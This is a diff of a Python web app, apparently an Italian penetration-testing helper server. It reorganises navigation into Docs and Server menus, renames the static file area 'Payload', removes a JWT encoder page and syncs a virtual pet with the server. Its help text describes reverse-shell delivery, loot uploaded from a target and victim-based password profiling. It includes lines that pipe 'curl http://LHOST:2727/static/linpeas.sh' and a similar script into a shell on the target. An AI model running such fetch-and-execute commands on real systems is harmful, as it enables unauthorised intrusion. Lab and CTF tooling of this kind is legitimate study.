@@ -377,11 +377,24 @@ position:sticky;top:0;z-index:10}
 .topbar .logo{font-size:16px;font-weight:700;color:var(--text);display:flex;
 align-items:center;gap:8px}
 .topbar .logo .prompt{color:var(--green);font-weight:700}
-.topbar nav{display:flex;gap:2px}
-.topbar nav a{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
+.topbar nav{display:flex;gap:2px;align-items:center}
+.topbar nav>a{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
 transition:all .15s;font-weight:500}
-.topbar nav a:hover{background:var(--hover);color:var(--text)}
-.topbar nav a.active{color:var(--accent);background:rgba(88,166,255,.1)}
+.topbar nav>a:hover{background:var(--hover);color:var(--text)}
+.topbar nav>a.active{color:var(--accent);background:rgba(88,166,255,.1)}
+.nav-drop{position:relative}
+.nav-drop>.nav-drop-btn{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
+transition:all .15s;font-weight:500;cursor:pointer;user-select:none}
+.nav-drop:hover>.nav-drop-btn,.nav-drop>.nav-drop-btn.active{background:var(--hover);color:var(--text)}
+.nav-drop>.nav-drop-btn.active{color:var(--accent);background:rgba(88,166,255,.1)}
+.nav-drop-menu{display:none;position:absolute;top:100%;left:0;background:var(--surface);
+border:1px solid var(--border);border-radius:6px;padding:4px 0;min-width:150px;
+box-shadow:0 4px 12px rgba(0,0,0,.3);z-index:20;margin-top:2px}
+.nav-drop:hover .nav-drop-menu{display:block}
+.nav-drop-menu a{display:block;padding:7px 16px;font-size:13px;color:var(--text2);
+font-weight:500;transition:all .15s}
+.nav-drop-menu a:hover{background:var(--hover);color:var(--text)}
+.nav-drop-menu a.active{color:var(--accent)}
 
 /* Home layout */
 .home-layout{display:grid;grid-template-columns:220px 1fr;gap:0;
@@ -633,7 +646,7 @@ vertical-align:top;word-break:break-all}
   .topbar-left{gap:10px;flex-wrap:wrap;width:100%}
   .topbar .logo{font-size:14px}
   .topbar nav{gap:0;flex-wrap:wrap}
-  .topbar nav a{font-size:12px;padding:6px 10px}
+  .topbar nav>a,.nav-drop>.nav-drop-btn{font-size:12px;padding:6px 10px}
   .home-layout{grid-template-columns:1fr;min-height:auto}
   .sidebar{border-right:none;border-bottom:1px solid var(--border);padding:12px 16px}
   .main-area{padding:16px}
@@ -677,7 +690,7 @@ vertical-align:top;word-break:break-all}
   .search-page-item .sp-name{font-size:14px}
 }
 @media(max-width:400px){
-  .topbar nav a{font-size:11px;padding:5px 7px}
+  .topbar nav>a,.nav-drop>.nav-drop-btn{font-size:11px;padding:5px 7px}
   .seal-art{font-size:5.5px}
   .container{padding:12px 8px 40px}
 }
@@ -765,23 +778,36 @@ def _discover_tools() -> list[tuple[str, str]]:
 
 
 def _base_html(title: str, body: str, active: str = "") -> str:
-    nav_items = [
-        ("/", "Home", "home"),
+    docs_keys = {"notes", "vuln", "tools"}
+    server_keys = {"static", "delivery", "loot", "logs"}
+
+    def _drop(label, items, active_key):
+        is_active = active_key in {k for _, _, k in items}
+        bcls = ' class="nav-drop-btn active"' if is_active else ' class="nav-drop-btn"'
+        h = f'<div class="nav-drop"><span{bcls}>{label} ▾</span><div class="nav-drop-menu">'
+        for href, lbl, key in items:
+            acls = ' class="active"' if key == active_key else ""
+            h += f'<a href="{href}"{acls}>{lbl}</a>'
+        h += '</div></div>'
+        return h
+
+    home_cls = ' class="active"' if active == "home" else ""
+    nav_html = f'<a href="/"{home_cls}>Home</a>'
+    nav_html += _drop("Docs", [
         ("/notes/", "Notes", "notes"),
         ("/vuln/", "Vuln", "vuln"),
         ("/tools/", "Tools", "tools"),
-        ("/static/", "Static", "static"),
+    ], active)
+    nav_html += _drop("Server", [
+        ("/static/", "Payload", "static"),
         ("/delivery", "Delivery", "delivery"),
         ("/loot/", "Loot", "loot"),
         ("/logs", "Logs", "logs"),
-        ("/jwt", "JWT", "jwt"),
-        ("/pet", "Pet", "pet"),
-        ("/burp", "BURP", "burp"),
-    ]
-    nav_html = ""
-    for href, label, key in nav_items:
-        cls = ' class="active"' if key == active else ""
-        nav_html += f'<a href="{href}"{cls}>{label}</a>'
+    ], active)
+    pet_cls = ' class="active"' if active == "pet" else ""
+    nav_html += f'<a href="/pet"{pet_cls}>Pet</a>'
+    burp_cls = ' class="active"' if active == "burp" else ""
+    nav_html += f'<a href="/burp"{burp_cls}>BURP</a>'
 
     return f"""<!DOCTYPE html>
 <html lang="it"><head>
@@ -885,15 +911,26 @@ def _page_home() -> str:
     <a href="https://github.com/Starlix27">@Starlix27</a>
   </div>
   <div class="info-box">
-    <div class="label">Categorie ospitate:</div>
+    <div class="label">Docs:</div>
     <ul class="cat-list">
       <li><a href="/notes/">Notes</a><span class="cnt">{n_notes} guide</span></li>
       <li><a href="/vuln/">Vuln</a><span class="cnt">{n_vulns} protocolli</span></li>
       <li><a href="/tools/">Tools</a><span class="cnt">{n_tools} tool</span></li>
-      <li><a href="/static/">Static</a><span class="cnt">{n_static} file</span></li>
-      <li><a href="/loot/">Loot</a><span class="cnt">{n_loot} file</span></li>
+    </ul>
+  </div>
+  <div class="info-box">
+    <div class="label">Server:</div>
+    <ul class="cat-list">
+      <li><a href="/static/">Payload</a><span class="cnt">{n_static} file</span></li>
       <li><a href="/delivery">Delivery</a><span class="cnt">payload &amp; curl</span></li>
+      <li><a href="/loot/">Loot</a><span class="cnt">{n_loot} file</span></li>
       <li><a href="/logs">Logs</a><span class="cnt">server logs</span></li>
+    </ul>
+  </div>
+  <div class="info-box">
+    <div class="label">Strumenti:</div>
+    <ul class="cat-list">
+      <li><a href="/pet">Pet</a><span class="cnt">sealion virtuale</span></li>
       <li><a href="/burp">BURP</a><span class="cnt">password profiler</span></li>
     </ul>
   </div>
@@ -917,7 +954,7 @@ def _page_home() -> str:
     <div class="suggestions" id="suggestions"></div>
     <div class="prompt-line">
       <span class="user">user@slweb</span>:<span class="path">~</span>$&nbsp;
-      <input type="text" id="term-input" placeholder="help, notes, vuln, tools, static..." autocomplete="off" spellcheck="false">
+      <input type="text" id="term-input" placeholder="help, notes, vuln, tools, payload..." autocomplete="off" spellcheck="false">
     </div>
   </div>
 </div>
@@ -928,11 +965,11 @@ def _page_home() -> str:
     {{name:'notes',label:'Notes',cnt:'{n_notes} guide',href:'/notes/'}},
     {{name:'vuln',label:'Vuln',cnt:'{n_vulns} protocolli',href:'/vuln/'}},
     {{name:'tools',label:'Tools',cnt:'{n_tools} tool',href:'/tools/'}},
-    {{name:'static',label:'Static',cnt:'{n_static} file',href:'/static/'}},
+    {{name:'static',label:'Payload',cnt:'{n_static} file',href:'/static/'}},
+    {{name:'payload',label:'Payload',cnt:'{n_static} file',href:'/static/'}},
     {{name:'loot',label:'Loot',cnt:'{n_loot} file',href:'/loot/'}},
     {{name:'delivery',label:'Delivery',cnt:'payload & curl',href:'/delivery'}},
     {{name:'logs',label:'Logs',cnt:'server logs',href:'/logs'}},
-    {{name:'jwt',label:'JWT',cnt:'encoder/decoder',href:'/jwt'}},
     {{name:'pet',label:'Pet',cnt:'sealion virtuale',href:'/pet'}},
     {{name:'burp',label:'BURP',cnt:'password profiler',href:'/burp'}},
   ];
@@ -951,26 +988,24 @@ def _page_home() -> str:
     '              <span class="t-line">Ogni scheda ha: descrizione, porte, vuln comuni, comandi enum</span>\\n'+
     '  <span class="t-accent">tools</span>       <span class="t-line">Documentazione e help dei tool installabili ({n_tools})</span>\\n'+
     '              <span class="t-line">Ogni tool ha guida d\\\'uso, opzioni principali ed esempi</span>\\n\\n'+
-    '  <span class="t-section">— Serve</span>\\n'+
+    '  <span class="t-section">— Server</span>\\n'+
+    '  <span class="t-accent">payload</span>     <span class="t-line">File manager per payload ({n_static} file)</span>\\n'+
+    '              <span class="t-line">Crea, importa, modifica e scarica file serviti su /static/</span>\\n'+
     '  <span class="t-accent">delivery</span>    <span class="t-line">Pannello comandi curl per post-exploitation</span>\\n'+
     '              <span class="t-line">Reverse shell, upgrade TTY, upload file — comandi pronti da copiare</span>\\n'+
-    '  <span class="t-accent">logs</span>        <span class="t-line">Log delle richieste HTTP ricevute dal server</span>\\n\\n'+
-    '  <span class="t-section">  Serve Operations</span>\\n'+
-    '  <span class="t-accent">static</span>      <span class="t-line">File manager per payload statici ({n_static} file)</span>\\n'+
-    '              <span class="t-line">Crea, importa, modifica e scarica file serviti su /static/</span>\\n'+
     '  <span class="t-accent">loot</span>        <span class="t-line">File ricevuti dalla vulnbox ({n_loot} file)</span>\\n'+
     '              <span class="t-line">Visualizza, scarica ed elimina i file caricati via curl /upload</span>\\n'+
+    '  <span class="t-accent">logs</span>        <span class="t-line">Log delle richieste HTTP ricevute dal server</span>\\n'+
     '  <span class="t-accent">tunnel</span>      <span class="t-line">Port forwarding via chisel per accedere a servizi interni</span>\\n'+
-    '              <span class="t-line">Mappa porte del target nel browser locale (tunnel help)</span>\\n'+
-    '  <span class="t-accent">jwt</span>         <span class="t-line">Apri il JWT Encoder/Decoder nel browser</span>\\n'+
-    '              <span class="t-line">Decodifica, crea e verifica token JWT — tutto client-side</span>\\n'+
+    '              <span class="t-line">Mappa porte del target nel browser locale (tunnel help)</span>\\n\\n'+
+    '  <span class="t-section">— Strumenti</span>\\n'+
     '  <span class="t-accent">pet</span>         <span class="t-line">Pet Portal — nutri, gioca e cura il tuo sealion</span>\\n'+
-    '              <span class="t-line">Feed, play, spin, annoy + mini-games (blackjack, wordle, 8ball)</span>\\n\\n'+
+    '              <span class="t-line">Feed, play, spin, annoy + mini-games (blackjack, wordle, 8ball)</span>\\n'+
+    '  <span class="t-accent">burp</span>        <span class="t-line">BURP — Profiler password avanzato (sostituisce CUPP)</span>\\n\\n'+
     '  <span class="t-section">— Wordlists</span>\\n'+
     '  <span class="t-accent">wordfind</span>    <span class="t-line">Wizard wordlist — suggerisce liste e comandi per fuzzing/brute-force</span>\\n'+
     '  <span class="t-accent">wordgen</span>     <span class="t-line">Wizard creazione wordlist personalizzate (cewl, crunch, ecc.)</span>\\n'+
-    '  <span class="t-accent">passfind</span>    <span class="t-line">Wizard password cracking — hash, file protetti, archivi, servizi</span>\\n'+
-    '  <span class="t-accent">burp</span>        <span class="t-line">BURP — Profiler password avanzato (sostituisce CUPP)</span>\\n\\n'+
+    '  <span class="t-accent">passfind</span>    <span class="t-line">Wizard password cracking — hash, file protetti, archivi, servizi</span>\\n\\n'+
     '  <span class="t-section">— Terminale</span>\\n'+
     '  <span class="t-accent">help</span>        <span class="t-line">Mostra questo messaggio</span>\\n'+
     '  <span class="t-accent">help</span> <span class="t-line">&lt;cmd&gt;</span>  <span class="t-line">Dettagli su un comando (es. <span class="t-accent">help loot</span>)</span>\\n'+
@@ -1005,7 +1040,18 @@ def _page_home() -> str:
       '<span class="t-line">post-exploitation, password cracking, wordlist.</span>\\n\\n'+
       '<span class="t-line">Digitando <span class="t-accent">tools</span> verrai portato alla pagina dei tool.</span>',
     static:
-      '<span class="t-head">static — File Manager Payload</span>\\n\\n'+
+      '<span class="t-head">payload — File Manager Payload</span>\\n\\n'+
+      '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
+      '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
+      '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
+      '<span class="t-line">I file precaricati includono linseal, linpeas, linenum,</span>\\n'+
+      '<span class="t-line">linux-exploit-suggester e pspy.</span>\\n\\n'+
+      '<span class="t-line">Il target può scaricarli con:</span>\\n'+
+      '<span class="t-accent">  curl http://LHOST:2727/static/linseal.sh | sh</span>\\n'+
+      '<span class="t-accent">  curl http://LHOST:2727/static/linpeas.sh | bash</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">static</span> verrai portato al file manager.</span>',
+    payload:
+      '<span class="t-head">payload — File Manager Payload</span>\\n\\n'+
       '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
       '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
       '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
@@ -1057,16 +1103,6 @@ def _page_home() -> str:
       '<span class="t-line">Esempio:</span>\\n'+
       '<span class="t-accent">  tunnel on 80</span> <span class="t-line">→ apri http://localhost:9000 nel browser</span>\\n\\n'+
       '<span class="t-line">Opzioni: <span class="t-accent">--local-port</span> (default 9000), <span class="t-accent">--server-port</span> (default 8443)</span>',
-    jwt:
-      '<span class="t-head">jwt — JWT Encoder / Decoder</span>\\\\n\\\\n'+
-      '<span class="t-line">Apre la pagina web per decodificare e creare JSON Web Token.</span>\\\\n'+
-      '<span class="t-line">Tutto il lavoro avviene nel browser (client-side, nessun invio al server).</span>\\\\n\\\\n'+
-      '<span class="t-line">Funzionalità:</span>\\\\n'+
-      '<span class="t-line">  • <span class="t-accent">Decode</span> — incolla un JWT, vedi header, payload e firma</span>\\\\n'+
-      '<span class="t-line">  • <span class="t-accent">Timestamp</span> — exp/iat/nbf convertiti in data leggibile</span>\\\\n'+
-      '<span class="t-line">  • <span class="t-accent">Verifica HMAC</span> — controlla la firma con un secret</span>\\\\n'+
-      '<span class="t-line">  • <span class="t-accent">Encode</span> — crea JWT con HS256/HS384/HS512 o alg:none</span>\\\\n\\\\n'+
-      '<span class="t-line">Digitando <span class="t-accent">jwt</span> verrai portato alla pagina JWT.</span>',
     burp:
       '<span class="t-head">burp — BURP Password Profiler</span>\\\\n\\\\n'+
       '<span class="t-line">Genera wordlist personalizzate basate sul profilo della vittima.</span>\\\\n'+
@@ -1125,7 +1161,7 @@ def _page_home() -> str:
       '<span class="t-line">Apre il portale del tuo sealion virtuale.</span>\\\\n'+
       '<span class="t-line">Nutrilo, gioca, fallo girare e tienilo felice!</span>\\\\n\\\\n'+
       '<span class="t-line">Funzioni: feed, play, spin, annoy, games (blackjack, wordle, guess, 8ball)</span>\\\\n'+
-      '<span class="t-line">Stato salvato nel browser (localStorage).</span>\\\\n\\\\n'+
+      '<span class="t-line">Stato sincronizzato con SLConsole (pet.json).</span>\\\\n\\\\n'+
       '<span class="t-line">Digitando <span class="t-accent">pet</span> verrai portato al Pet Portal.</span>',
   }};
 
@@ -1189,7 +1225,7 @@ def _page_home() -> str:
     }}
     const merged=allNames.filter(n=>n.startsWith(q)).map(n=>{{
       const c=cats.find(x=>x.name===n);if(c)return c;
-      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',tunnel:'Port forwarding via chisel',jwt:'JWT Encoder/Decoder',pet:'Pet Portal — sealion virtuale',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
+      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',tunnel:'Port forwarding via chisel',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
       return {{name:n,label:n.charAt(0).toUpperCase()+n.slice(1),cnt:lb[n]||'',href:null}};
     }});
     render(merged);
@@ -1219,29 +1255,40 @@ def _page_home() -> str:
 }})();
 (function(){{
   var w=document.getElementById('pet-widget');
-  var raw=localStorage.getItem('sl_pet');
-  if(!raw&&!w)return;
-  try{{
-    var pet=raw?JSON.parse(raw):{{name:'SeaLion',happiness:50,fullness:50,updated:0}};
+  if(!w)return;
+  var bar=function(l,v){{
+    var c=v>=60?'var(--green)':v>=30?'var(--yellow)':'var(--red)';
+    return '<div style="display:flex;align-items:center;gap:6px;margin:2px 0">'+
+      '<span style="color:var(--text2);width:55px;font-size:11px">'+l+'</span>'+
+      '<div style="flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden">'+
+      '<div style="width:'+v+'%;height:100%;background:'+c+';border-radius:3px;transition:width .3s"></div>'+
+      '</div><span style="font-size:11px;color:var(--text2);width:28px;text-align:right">'+v+'%</span></div>';
+  }};
+  function renderPet(pet){{
     var u=parseFloat(pet.updated)||0;
     var el=u>0?Math.max(0,Date.now()/1000-u):0;
     var tk=Math.floor(el/600);
     var h=Math.max(0,Math.min(100,(pet.happiness||50)-tk));
     var f=Math.max(0,Math.min(100,(pet.fullness||50)-tk));
-    if(!raw)localStorage.setItem('sl_pet',JSON.stringify(pet));
     var nm=document.getElementById('pet-home-name');
     nm.textContent=pet.name||'SeaLion';
     nm.onclick=function(){{location.href='/pet';}};
-    var bar=function(l,v){{
-      var c=v>=60?'var(--green)':v>=30?'var(--yellow)':'var(--red)';
-      return '<div style="display:flex;align-items:center;gap:6px;margin:2px 0">'+
-        '<span style="color:var(--text2);width:55px;font-size:11px">'+l+'</span>'+
-        '<div style="flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden">'+
-        '<div style="width:'+v+'%;height:100%;background:'+c+';border-radius:3px;transition:width .3s"></div>'+
-        '</div><span style="font-size:11px;color:var(--text2);width:28px;text-align:right">'+v+'%</span></div>';
-    }};
     document.getElementById('pet-home-bars').innerHTML=bar('Felicità',h)+bar('Sazietà',f);
     w.style.display='';
+  }}
+  try{{
+    var raw=localStorage.getItem('sl_pet');
+    var pet=raw?JSON.parse(raw):{{name:'SeaLion',happiness:50,fullness:50,updated:0}};
+    if(!raw)localStorage.setItem('sl_pet',JSON.stringify(pet));
+    renderPet(pet);
+    fetch('/api/pet').then(function(r){{return r.json();}}).then(function(srv){{
+      var su=parseFloat(srv.updated)||0;
+      var lu=parseFloat(pet.updated)||0;
+      if(su>lu){{
+        localStorage.setItem('sl_pet',JSON.stringify(srv));
+        renderPet(srv);
+      }}
+    }}).catch(function(){{}});
   }}catch(e){{}}
 }})();
 (function(){{
@@ -1379,8 +1426,8 @@ def _page_static_list() -> str:
         cards = '<p style="color:var(--text2)">Nessun file. Crea un nuovo file o usa <code>serve fetch</code> dalla console.</p>'
 
     body = f"""<div class="container">
-<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Static Files</div>
-<div class="page-title">Static Files</div>
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Payload</div>
+<div class="page-title">Payload</div>
 <div class="page-sub">{len(files)} file disponibili</div>
 
 <div class="btn-group">
@@ -1458,7 +1505,7 @@ function deleteFile(name){{
 }}
 </script>
 </div>"""
-    return _base_html("Static", body, active="static")
+    return _base_html("Payload", body, active="static")
 
 
 def _page_static_edit(name: str) -> str:
@@ -1486,7 +1533,7 @@ Questo file è binario e non può essere modificato nel browser.<br>
 </div>"""
 
     body = f"""<div class="container">
-<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/static/">Static</a> <span>/</span> {ename}</div>
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/static/">Payload</a> <span>/</span> {ename}</div>
 <div class="editor-topbar">
 <span class="fname">{ename}</span>
 <div>
@@ -1721,414 +1768,6 @@ def _page_loot_view(name: str) -> str:
 </div>"""
     return _base_html(f"Loot — {name}", body, active="loot")
 
-
-def _page_jwt() -> str:
-    body = """\
-<div class="container">
-<div class="breadcrumb"><a href="/">Home</a> <span>/</span> JWT</div>
-<div style="display:flex;align-items:center;gap:16px;margin-bottom:4px">
-<div class="page-title" style="margin:0">JWT</div>
-<div id="jwt-tabs" style="display:flex;gap:2px;background:var(--surface);border-radius:6px;padding:2px;border:1px solid var(--border)">
-<button class="jt-tab active" data-tab="decode" onclick="switchTab('decode')">Decoder</button>
-<button class="jt-tab" data-tab="encode" onclick="switchTab('encode')">Encoder</button>
-</div>
-<div id="jwt-badge" style="margin-left:auto;font-size:12px;padding:4px 10px;border-radius:4px;display:none"></div>
-</div>
-<div class="page-sub">Decodifica, modifica e crea JSON Web Token</div>
-
-<style>
-.jt-tab{background:none;border:none;color:var(--text2);padding:6px 16px;border-radius:4px;
-  cursor:pointer;font-size:13px;font-weight:500;transition:all .15s}
-.jt-tab.active{background:var(--accent);color:#fff}
-.jt-tab:hover:not(.active){color:var(--text)}
-.jwt-wrap{display:flex;gap:0;margin-top:16px;border:1px solid var(--border);border-radius:8px;overflow:hidden;min-height:480px}
-.jwt-left,.jwt-right{flex:1;min-width:0}
-.jwt-left{background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
-.jwt-right{background:var(--bg);display:flex;flex-direction:column}
-.jwt-panel-head{padding:12px 16px;font-size:11px;text-transform:uppercase;letter-spacing:1px;
-  color:var(--text2);font-weight:600;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
-.jwt-panel-head .badge{font-size:10px;padding:2px 8px;border-radius:3px;text-transform:none;letter-spacing:0}
-.jwt-encoded{flex:1;padding:16px;overflow:auto;position:relative}
-.jwt-encoded textarea{width:100%;height:100%;min-height:400px;background:transparent;border:none;
-  color:transparent;caret-color:var(--text);font-family:'SFMono-Regular',Consolas,monospace;font-size:14px;line-height:1.7;
-  resize:none;outline:none;word-break:break-all;box-sizing:border-box;position:relative;z-index:1}
-.jwt-colored{font-family:'SFMono-Regular',Consolas,monospace;font-size:14px;line-height:1.7;
-  word-break:break-all;min-height:400px;white-space:pre-wrap;
-  position:absolute;top:16px;left:16px;right:16px;pointer-events:none;z-index:0}
-.jwt-colored .jc-h{color:#fb015b}.jwt-colored .jc-d{color:var(--text2)}
-.jwt-colored .jc-p{color:#d63aff}.jwt-colored .jc-s{color:#00b9f1}
-.jwt-section{padding:16px;border-bottom:1px solid var(--border)}
-.jwt-section:last-child{border-bottom:none}
-.jwt-section-head{display:flex;align-items:center;gap:8px;margin-bottom:10px}
-.jwt-section-head .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
-.jwt-section-head .lbl{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text2);font-weight:600}
-.jwt-section textarea{width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:6px;padding:10px 12px;font-family:'SFMono-Regular',Consolas,monospace;font-size:13px;
-  line-height:1.5;resize:vertical;outline:none;box-sizing:border-box;tab-size:2}
-.jwt-section textarea:focus{border-color:var(--accent)}
-.jwt-ts{font-size:11px;color:var(--text2);margin-top:8px;line-height:1.7}
-.jwt-ts .expired{color:var(--red)}.jwt-ts .valid{color:var(--green)}
-.jwt-sig-box{display:flex;gap:8px;align-items:center;margin-top:8px}
-.jwt-sig-box input{flex:1;background:var(--surface);color:var(--text);border:1px solid var(--border);
-  border-radius:4px;padding:7px 10px;font-family:monospace;font-size:12px;outline:none}
-.jwt-sig-box input:focus{border-color:var(--accent)}
-.jwt-sig-verify{font-size:12px;margin-top:6px;min-height:18px}
-.jwt-alg-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
-.jwt-alg-btn{padding:5px 12px;border-radius:4px;font-size:11px;font-weight:600;cursor:pointer;
-  border:1px solid var(--border);background:var(--surface);color:var(--text2);transition:all .15s}
-.jwt-alg-btn:hover{border-color:var(--accent);color:var(--text)}
-.jwt-alg-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
-.jwt-alg-btn.warn{background:#332800;color:#d29922;border-color:#554400}
-.jwt-alg-btn.warn:hover{background:#443300}
-.jwt-copy-bar{display:flex;align-items:center;gap:8px;padding:10px 16px;border-top:1px solid var(--border);background:var(--surface2)}
-.jwt-copy-btn{background:var(--surface);color:var(--accent);border:1px solid var(--border);
-  border-radius:4px;padding:5px 14px;font-size:12px;cursor:pointer;margin-left:auto}
-.jwt-copy-btn:hover{background:var(--border)}
-@media(max-width:800px){.jwt-wrap{flex-direction:column}.jwt-left{border-right:none;border-bottom:1px solid var(--border)}}
-</style>
-
-<!-- DECODER VIEW -->
-<div id="view-decode">
-<div class="jwt-wrap">
-<div class="jwt-left">
-  <div class="jwt-panel-head">Encoded Token
-    <button class="jwt-copy-btn" style="margin-left:auto;padding:3px 10px;font-size:11px" onclick="copyEncoded()">Copia</button>
-  </div>
-  <div class="jwt-encoded">
-    <div id="jwt-colored" class="jwt-colored"></div>
-    <textarea id="jwt-in" spellcheck="false" placeholder="Incolla un JWT qui..."></textarea>
-  </div>
-</div>
-<div class="jwt-right">
-  <div class="jwt-panel-head">Decoded
-    <span id="jwt-err" style="color:var(--red);font-size:12px;text-transform:none;letter-spacing:0"></span>
-  </div>
-  <div class="jwt-section">
-    <div class="jwt-section-head"><span class="dot" style="background:#fb015b"></span><span class="lbl">Header</span>
-      <span id="jwt-alg" style="font-size:11px;color:var(--text2);margin-left:auto"></span></div>
-    <textarea id="jwt-header" rows="4" spellcheck="false"></textarea>
-  </div>
-  <div class="jwt-section">
-    <div class="jwt-section-head"><span class="dot" style="background:#d63aff"></span><span class="lbl">Payload</span>
-      <span id="jwt-sub" style="font-size:11px;color:var(--text2);margin-left:auto"></span></div>
-    <textarea id="jwt-payload" rows="8" spellcheck="false"></textarea>
-    <div id="jwt-times" class="jwt-ts"></div>
-  </div>
-  <div class="jwt-section">
-    <div class="jwt-section-head"><span class="dot" style="background:#00b9f1"></span><span class="lbl">Verify Signature</span></div>
-    <div class="jwt-alg-row">
-      <button class="jwt-alg-btn" data-alg="HS256" onclick="setAlg(this)">HS256</button>
-      <button class="jwt-alg-btn" data-alg="HS384" onclick="setAlg(this)">HS384</button>
-      <button class="jwt-alg-btn" data-alg="HS512" onclick="setAlg(this)">HS512</button>
-      <button class="jwt-alg-btn warn active" data-alg="none" onclick="setAlg(this)">none</button>
-    </div>
-    <div class="jwt-sig-box">
-      <input id="jwt-secret" type="text" placeholder="Secret key" value="secret">
-      <button class="jwt-copy-btn" style="margin-left:0" onclick="doVerify()">Verifica</button>
-    </div>
-    <div id="jwt-verify" class="jwt-sig-verify"></div>
-  </div>
-</div>
-</div>
-</div>
-
-<!-- ENCODER VIEW -->
-<div id="view-encode" style="display:none">
-<div class="jwt-wrap">
-<div class="jwt-left">
-  <div class="jwt-panel-head">Build Token</div>
-  <div style="flex:1;display:flex;flex-direction:column">
-    <div class="jwt-section" style="flex:0">
-      <div class="jwt-section-head"><span class="dot" style="background:#fb015b"></span><span class="lbl">Header</span></div>
-      <textarea id="enc-header" rows="3" spellcheck="false">{"alg":"HS256","typ":"JWT"}</textarea>
-    </div>
-    <div class="jwt-section" style="flex:1">
-      <div class="jwt-section-head"><span class="dot" style="background:#d63aff"></span><span class="lbl">Payload</span></div>
-      <textarea id="enc-payload" rows="8" spellcheck="false">{"sub":"1","name":"test","iat":0}</textarea>
-    </div>
-    <div class="jwt-section" style="flex:0">
-      <div class="jwt-section-head"><span class="dot" style="background:#00b9f1"></span><span class="lbl">Signature</span></div>
-      <div class="jwt-alg-row">
-        <button class="jwt-alg-btn active" data-alg="HS256" onclick="setEncAlg(this)">HS256</button>
-        <button class="jwt-alg-btn" data-alg="HS384" onclick="setEncAlg(this)">HS384</button>
-        <button class="jwt-alg-btn" data-alg="HS512" onclick="setEncAlg(this)">HS512</button>
-        <button class="jwt-alg-btn warn" data-alg="none" onclick="setEncAlg(this)">none</button>
-      </div>
-      <div class="jwt-sig-box" style="margin-top:8px">
-        <input id="enc-secret" type="text" value="secret" placeholder="Secret key">
-      </div>
-    </div>
-  </div>
-</div>
-<div class="jwt-right">
-  <div class="jwt-panel-head">Generated Token
-    <button class="jwt-copy-btn" style="margin-left:auto;padding:3px 10px;font-size:11px" onclick="copyGenerated()">Copia</button>
-  </div>
-  <div class="jwt-encoded" style="display:flex;flex-direction:column">
-    <div id="enc-colored" class="jwt-colored" style="flex:1"></div>
-    <div id="enc-err" style="color:var(--red);font-size:12px;padding:0 0 8px;min-height:18px"></div>
-  </div>
-</div>
-</div>
-</div>
-
-</div>
-<script>
-(function(){
-  var activeTab='decode';
-  var decAlg='none';
-  var encAlg='HS256';
-
-  function b64uDec(s){
-    s=s.replace(/-/g,'+').replace(/_/g,'/');
-    while(s.length%4)s+='=';
-    return atob(s);
-  }
-  function b64uEnc(s){
-    return btoa(unescape(encodeURIComponent(s))).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
-  }
-  function u8b64u(u8){
-    var bin='';for(var i=0;i<u8.length;i++)bin+=String.fromCharCode(u8[i]);
-    return btoa(bin).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
-  }
-  function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
-  function fmtTs(v){
-    if(typeof v!=='number')return null;
-    var d=new Date(v*1000);
-    return d.toISOString().replace('T',' ').replace(/\\.\\d+Z/,' UTC');
-  }
-
-  var algMap={'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'};
-  var inp=document.getElementById('jwt-in');
-  var colored=document.getElementById('jwt-colored');
-  var errEl=document.getElementById('jwt-err');
-  var headerEl=document.getElementById('jwt-header');
-  var payloadEl=document.getElementById('jwt-payload');
-  var algEl=document.getElementById('jwt-alg');
-  var subEl=document.getElementById('jwt-sub');
-  var timesEl=document.getElementById('jwt-times');
-  var verifyEl=document.getElementById('jwt-verify');
-  var badge=document.getElementById('jwt-badge');
-  var rebuildGen=0;
-
-  window.switchTab=function(tab){
-    activeTab=tab;
-    document.querySelectorAll('.jt-tab').forEach(function(b){
-      b.classList.toggle('active',b.dataset.tab===tab);
-    });
-    document.getElementById('view-decode').style.display=tab==='decode'?'':'none';
-    document.getElementById('view-encode').style.display=tab==='encode'?'':'none';
-    if(tab==='encode')buildEncoder();
-  };
-
-  function colorize(raw){
-    var parts=raw.split('.');
-    if(parts.length<2){colored.textContent=raw;return;}
-    colored.innerHTML='<span class="jc-h">'+esc(parts[0])+'</span>'+
-      '<span class="jc-d">.</span><span class="jc-p">'+esc(parts[1])+'</span>'+
-      (parts.length>2?'<span class="jc-d">.</span><span class="jc-s">'+esc(parts[2])+'</span>':'');
-  }
-
-  function showBadge(ok,text){
-    badge.style.display='';
-    badge.textContent=text;
